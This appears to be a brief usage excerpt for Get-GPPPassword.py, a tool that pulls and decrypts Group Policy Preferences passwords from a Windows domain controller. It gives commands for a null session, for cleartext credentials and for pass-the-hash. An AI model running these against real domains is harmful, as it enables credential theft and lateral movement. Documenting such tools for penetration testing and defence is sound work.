- - -
Python script for extracting and decrypting Group Policy Preferences passwords.

### With a NULL session

```python
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
```

### With cleartext credentials

```python
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

### pass-the-hash

```python
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```